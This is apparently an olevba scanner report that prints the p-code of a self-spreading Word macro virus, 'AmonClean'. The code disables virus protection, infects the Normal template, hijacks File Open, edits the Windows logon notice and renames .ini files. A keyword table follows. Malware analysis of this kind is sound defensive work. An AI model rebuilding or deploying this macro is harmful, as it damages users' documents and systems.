' 	EndIfBlock 
' Line #113:
' 	StartForVariable 
' 	Next 
' Line #114:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #115:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AmonClean"
' 	Eq 
' 	IfBlock 
' Line #116:
' 	LitVarSpecial (True)
' 	St DocAmon 
' Line #117:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #118:
' 	LitVarSpecial (True)
' 	St DocAmonL 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	StartForVariable 
' 	Next 
' Line #122:
' 	Ld DocAmonL 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #123:
' 	LitVarSpecial (False)
' 	St DocAmon 
' Line #124:
' 	LineCont 0x0004 09 00 05 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	Ld TempAmonL 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #127:
' 	LitVarSpecial (False)
' 	St TempAmon 
' Line #128:
' 	LineCont 0x0004 09 00 05 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld DocAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld TempAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #131:
' 	LineCont 0x0008 0E 00 04 00 18 00 04 00
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #132:
' 	LineCont 0x0008 0E 00 04 00 18 00 04 00
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #133:
' 	LitVarSpecial (True)
' 	St DocAmon 
' Line #134:
' 	LitVarSpecial (True)
' 	St TempAmon 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	Ld DocAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #138:
' 	ArgsCall Temo 0x0000 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	Ld TempAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #141:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #142:
' 	ArgsCall Temo 0x0000 
' Line #143:
' 	EndIfBlock 
' Line #144:
' 	Label Getout 
' Line #145:
' 	EndFunc 
' Line #146:
' 	FuncDefn (Private Function Temo(id_FFFE As Variant))
' Line #147:
' 	Dim 
' 	VarDefn a
' 	VarDefn c (As String)
' Line #148:
' 	Dim 
' 	VarDefn B (As Long)
' Line #149:
' 	OnError Getout 
' Line #150:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St c 
' Line #151:
' 	Ld c 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #152:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St a 
' Line #153:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	St B 
' Line #154:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #155:
' 	Ld a 
' 	ParamNamed FileName 
' 	Ld B 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	Label Getout 
' Line #158:
' 	EndFunc 
' Line #159:
' Line #160:
' Line #161:
' Line #162:
' Line #163:
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' Line #168:
' Line #169:
' Line #170:
' Line #171:
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' Line #182:
' Line #183:
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' Line #188:
' Line #189:
' Line #190:
' Macros/VBA/AmonClean - 11114 bytes
' Line #0:
' 	FuncDefn (Function just())
' Line #1:
' 	Dim 
' 	VarDefn DelFlag (As Boolean)
' Line #2:
' 	Dim 
' 	VarDefn DocAmon
' 	VarDefn TempAmon
' 	VarDefn DocAmonL
' 	VarDefn TempAmonL (As Boolean)
' Line #3:
' 	Dim 
' 	VarDefn i
' 	VarDefn x (As Integer)
' Line #4:
' 	Dim 
' 	VarDefn MacroNames (As String)
' Line #5:
' 	OnError Getout 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #7:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #8:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #11:
' 	LitVarSpecial (False)
' 	St DocAmon 
' Line #12:
' 	LitVarSpecial (False)
' 	St TempAmon 
' Line #13:
' 	LitVarSpecial (False)
' 	St DocAmonL 
' Line #14:
' 	LitVarSpecial (False)
' 	St TempAmonL 
' Line #15:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #16:
' 	Ld DelFlag 
' 	Paren 
' 	DoWhile 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St MacroNames 
' Line #19:
' 	Ld MacroNames 
' 	LitStr 0x0009 "AmonClean"
' 	Ne 
' 	Ld MacroNames 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #20:
' 	LineCont 0x0004 09 00 05 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacroNames 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #21:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #22:
' 	LineCont 0x0004 06 00 04 00
' 	LitStr 0x000C "Find Micro ["
' 	Ld MacroNames 
' 	Concat 
' 	LitStr 0x0013 "] ,I shall kill it!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001B "Micro Virus Killer Ver. 1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #23:
' 	ExitFor 
' Line #24:
' 	ElseBlock 
' Line #25:
' 	LitVarSpecial (False)
' 	St DelFlag 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	StartForVariable 
' 	Next 
' Line #28:
' 	Loop 
' Line #29:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #30:
' 	Ld DelFlag 
' 	Paren 
' 	DoWhile 
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St MacroNames 
' Line #33:
' 	Ld MacroNames 
' 	LitStr 0x0009 "AmonClean"
' 	Ne 
' 	Ld MacroNames 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #34:
' 	LineCont 0x0004 09 00 05 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld MacroNames 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #35:
' 	LitVarSpecial (True)
' 	St DelFlag 
' Line #36:
' 	LineCont 0x0004 06 00 04 00
' 	LitStr 0x000C "Find Micro ["
' 	Ld MacroNames 
' 	Concat 
' 	LitStr 0x0013 "] ,I shall kill it!"
' 	Concat 
' 	Ld vbCritical 
' 	LitStr 0x001B "Micro Virus Killer Ver. 1.2"
' 	ArgsCall MsgBox 0x0003 
' Line #37:
' 	ExitFor 
' Line #38:
' 	ElseBlock 
' Line #39:
' 	LitVarSpecial (False)
' 	St DelFlag 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	Loop 
' Line #43:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #44:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AmonClean"
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitVarSpecial (True)
' 	St TempAmon 
' Line #46:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #47:
' 	LitVarSpecial (True)
' 	St TempAmonL 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	StartForVariable 
' 	Next 
' Line #51:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #52:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0009 "AmonClean"
' 	Eq 
' 	IfBlock 
' Line #53:
' 	LitVarSpecial (True)
' 	St DocAmon 
' Line #54:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0032 
' 	Lt 
' 	IfBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St DocAmonL 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Next 
' Line #59:
' 	Ld DocAmonL 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitVarSpecial (False)
' 	St DocAmon 
' Line #61:
' 	LineCont 0x0004 09 00 05 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld TempAmonL 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	LitVarSpecial (False)
' 	St TempAmon 
' Line #65:
' 	LineCont 0x0004 09 00 05 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Ld DocAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #69:
' 	ArgsCall Temo 0x0000 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	Ld TempAmon 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	LineCont 0x0008 09 00 04 00 13 00 04 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0009 "AmonClean"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	ArgsCall Temo 0x0000 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Label Getout 
' Line #76:
' 	EndFunc 
' Line #77:
' 	FuncDefn (Private Function Temo())
' Line #78:
' 	Dim 
' 	VarDefn a
' 	VarDefn c (As String)
' Line #79:
' 	Dim 
' 	VarDefn B (As Long)
' Line #80:
' 	OnError Getout 
' Line #81:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St c 
' Line #82:
' 	Ld c 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #83:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St a 
' Line #84:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	St B 
' Line #85:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x0010 "\MicroKiller.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #86:
' 	Ld a 
' 	ParamNamed FileName 
' 	Ld B 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0003 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	Label Getout 
' Line #89:
' 	EndFunc 
' Line #90:
' 	FuncDefn (Function Acting())
' Line #91:
' 	Dim 
' 	VarDefn ch
' 	VarDefn Aname
' 	VarDefn N
' 	VarDefn MyName (As String)
' Line #92:
' 	OnError Getout 
' Line #93:
' 	LineCont 0x0004 08 00 06 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0004 "Amon"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St ch 
' Line #94:
' 	Ld ch 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St ch 
' Line #95:
' 	LineCont 0x0004 06 00 06 00
' 	Ld ch 
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0004 "Amon"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #96:
' 	Ld ch 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x07B8 
' 	Gt 
' 	Ld System 
' 	MemLd Version 
' 	LitStr 0x0004 "4.10"
' 	Eq 
' 	And 
' 	Paren 
' 	IfBlock 
' Line #97:
' 	LineCont 0x0004 06 00 06 00
' 	LitStr 0x001F "I Believe Enough To Say That..."
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon"
' 	LitStr 0x0012 "legalNoticecaption"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #98:
' 	LineCont 0x0004 06 00 06 00
' 	LitStr 0x000B "I Love Amon"
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\winlogon"
' 	LitStr 0x000F "legalNoticeText"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Ld ch 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x07D1 
' 	Gt 
' 	Ld ch 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x07B8 
' 	Gt 
' 	Ld System 
' 	MemLd Version 
' 	LitStr 0x0004 "4.10"
' 	Ne 
' 	And 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #101:
' 	LineCont 0x0004 08 00 06 00
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0009 "oldwindir"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St Aname 
' Line #102:
' 	Ld Aname 
' 	LitStr 0x0006 "\*.ini"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St MyName 
' Line #103:
' 	Ld MyName 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #104:
' 	Ld MyName 
' 	Ld MyName 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "lnl"
' 	Add 
' 	St N 
' 	BoS 0x0000 
' 	Ld Aname 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld MyName 
' 	Add 
' 	Ld Aname 
' 	LitStr 0x0001 "\"
' 	Add 
' 	Ld N 
' 	Add 
' 	Name 
' 	BoS 0x0000 
' 	Ld Dir 
' 	St MyName 
' Line #105:
' 	Loop 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Label Getout 
' Line #108:
' 	EndFunc 
' Line #109:
' 	FuncDefn (Sub Doit())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	Dim 
' 	VarDefn x1
' 	VarDefn x2
' 	VarDefn x3
' 	VarDefn x4
' Line #112:
' 	Dim 
' 	VarDefn ctl
' Line #113:
' 	Dim 
' 	VarDefn zz (As String)
' Line #114:
' 	Dim 
' 	VarDefn z (As Integer) 0x0007
' Line #115:
' 	SetStmt 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	MemLd Controls 
' 	Set x1 
' Line #116:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x1 
' 	MemLd Count 
' 	For 
' Line #117:
' 	Ld z 
' 	Ld x1 
' 	ArgsMemLd Item 0x0001 
' 	MemLd ID 
' 	LitDI2 0x0017 
' 	Eq 
' 	IfBlock 
' Line #118:
' 	Ld z 
' 	Ld x1 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #119:
' 	LineCont 0x0004 07 00 0A 00
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	LitDI2 0x0002 
' 	ParamNamed Before 
' 	Ld x1 
' 	ArgsMemCall Add 0x0003 
' Line #120:
' 	LitDI2 0x0017 
' 	Ld z 
' 	Ld x1 
' 	ArgsMemLd Item 0x0001 
' 	MemSt FaceId 
' Line #121:
' 	LitStr 0x0004 "NoNo"
' 	Ld z 
' 	Ld x1 
' 	ArgsMemLd Item 0x0001 
' 	MemSt OnAction 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	StartForVariable 
' 	Next 
' Line #124:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	MemLd Controls 
' 	ArgsMemLd Item 0x0001 
' 	Set x2 
' Line #125:
' 	SetStmt 
' 	Ld x2 
' 	MemLd CommandBar 
' 	MemLd Controls 
' 	Set x3 
' Line #126:
' 	StartForVariable 
' 	Ld z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x3 
' 	MemLd Count 
' 	For 
' Line #127:
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	MemLd ID 
' 	LitDI2 0x0017 
' 	Eq 
' 	IfBlock 
' Line #128:
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Caption 
' 	St zz 
' Line #129:
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #130:
' 	LineCont 0x0004 07 00 0A 00
' 	Ld msoControlButton 
' 	ParamNamed TypeOf 
' 	LitDI2 0x0001 
' 	ParamNamed ID 
' 	LitDI2 0x0002 
' 	ParamNamed Before 
' 	Ld x3 
' 	ArgsMemCall Add 0x0003 
' Line #131:
' 	LitDI2 0x0017 
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	MemSt FaceId 
' Line #132:
' 	LitStr 0x0004 "NoNo"
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	MemSt OnAction 
' Line #133:
' 	Ld zz 
' 	Ld z 
' 	Ld x3 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Caption 
' Line #134:
' 	EndIfBlock 
' Line #135:
' 	StartForVariable 
' 	Next 
' Line #136:
' 	Label jojy 
' Line #137:
' 	EndSub 
' Line #138:
' 	FuncDefn (Sub NoNo())
' Line #139:
' 	Dim 
' 	VarDefn ach
' Line #140:
' 	ArgsCall ItOn 0x0000 
' Line #141:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	St ach 
' Line #142:
' 	Ld ach 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #143:
' 	ArgsCall just 0x0000 
' Line #144:
' 	ArgsCall Acting 0x0000 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	ArgsCall ItOff 0x0000 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub Fileopen())
' Line #149:
' 	ArgsCall NoNo 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub AutoOpen())
' Line #152:
' 	ArgsCall ItOn 0x0000 
' Line #153:
' 	ArgsCall Doit 0x0000 
' Line #154:
' 	ArgsCall just 0x0000 
' Line #155:
' 	ArgsCall Acting 0x0000 
' Line #156:
' 	ArgsCall ItOff 0x0000 
' Line #157:
' 	EndSub 
' Line #158:
' 	FuncDefn (Sub AutoClose())
' Line #159:
' 	ArgsCall ItOn 0x0000 
' Line #160:
' 	ArgsCall Doit 0x0000 
' Line #161:
' 	ArgsCall just 0x0000 
' Line #162:
' 	ArgsCall Acting 0x0000 
' Line #163:
' 	ArgsCall ItOff 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' 	FuncDefn (Sub AutoNew())
' Line #166:
' 	ArgsCall just 0x0000 
' Line #167:
' 	ArgsCall Doit 0x0000 
' Line #168:
' 	ArgsCall Acting 0x0000 
' Line #169:
' 	EndSub 
' Line #170:
' 	FuncDefn (Sub fileexit())
' Line #171:
' 	ArgsCall autoexit 0x0000 
' Line #172:
' 	EndSub 
' Line #173:
' 	FuncDefn (Sub autoexit())
' Line #174:
' 	ArgsCall Doit 0x0000 
' Line #175:
' 	ArgsCall ItOn 0x0000 
' Line #176:
' 	ArgsCall just 0x0000 
' Line #177:
' 	ArgsCall Acting 0x0000 
' Line #178:
' 	ArgsCall ItOff 0x0000 
' Line #179:
' 	EndSub 
' Line #180:
' 	FuncDefn (Sub autoexec())
' Line #181:
' 	ArgsCall Doit 0x0000 
' Line #182:
' 	ArgsCall just 0x0000 
' Line #183:
' 	ArgsCall Acting 0x0000 
' Line #184:
' 	ArgsCall ItOn 0x0000 
' Line #185:
' 	ArgsCall just 0x0000 
' Line #186:
' 	ArgsCall Acting 0x0000 
' Line #187:
' 	ArgsCall ItOff 0x0000 
' Line #188:
' 	EndSub 
' Line #189:
' 	FuncDefn (Function ItOn())
' Line #190:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #191:
' 	EndFunc 
' Line #192:
' 	FuncDefn (Function ItOff())
' Line #193:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #194:
' 	EndFunc 
' Line #195:
' 	FuncDefn (Sub ViewVBCode())
' Line #196:
' 	EndSub 
' Line #197:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|AutoExec  |Document_new        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|kill                |May delete a file                            |
|Suspicious|Doit                |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

